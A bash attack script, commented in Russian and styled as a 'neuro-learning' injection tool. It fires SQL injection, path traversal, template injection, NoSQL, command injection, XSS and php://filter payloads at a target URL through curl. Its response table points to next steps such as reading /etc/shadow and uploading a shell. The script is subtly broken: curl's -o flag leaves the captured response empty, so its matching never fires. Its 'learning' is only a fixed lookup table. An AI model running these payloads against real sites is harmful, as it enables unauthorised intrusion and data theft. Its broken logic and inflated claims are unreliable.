#!/bin/bash
# NEURO-INJECTOR — Инъекции которые учатся на ответах
TARGET=$1
BRAIN="$HOME/.shadow_brain/neuro"
mkdir -p "$BRAIN"

[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — NEURO-INJECTOR            ║"
echo "║   Инъекции с нейро-обучением               ║"
echo "╚══════════════════════════════════════════════╝"

# База знаний: ответ → что делать
declare -A KNOWLEDGE
KNOWLEDGE["sql syntax"]="SQLi найден! Увеличить уровень до 5"
KNOWLEDGE["root:"]="LFI найден! Читать /etc/shadow"
KNOWLEDGE["uid="]="RCE найден! Загружать shell"
KNOWLEDGE["49"]="SSTI найден! Пробовать {{config}}"
KNOWLEDGE["__schema"]="GraphQL найден! Дамп схемы"
KNOWLEDGE["error"]="Ошибка! Анализировать тип"
KNOWLEDGE["forbidden"]="WAF! Менять тактику"
KNOWLEDGE["not found"]="Эндпоинт не существует"

# Тестируем и учимся
echo "[NEURO] Начинаю обучение..."

PAYLOADS=(
    "' OR '1'='1" "1' AND SLEEP(1)--" "../../etc/passwd"
    "{{7*7}}" '{"$gt":""}' "1 UNION SELECT NULL--"
    ";id" "<script>alert(1)</script>" "php://filter/resource=index"
)

for payload in "${PAYLOADS[@]}"; do
    RESP=$(curl -sk --max-time 5 "$TARGET?q=$payload" -o /tmp/neuro_test.html 2>/dev/null)
    
    for pattern in "${!KNOWLEDGE[@]}"; do
        if echo "$RESP" | grep -qi "$pattern"; then
            echo "  🧠 ${KNOWLEDGE[$pattern]}"
            echo "$payload → $pattern → ${KNOWLEDGE[$pattern]}" >> "$BRAIN/learned.txt"
            break
        fi
    done
done

echo "[NEURO] Обучено паттернов: $(wc -l < "$BRAIN/learned.txt" 2>/dev/null || echo 0)"
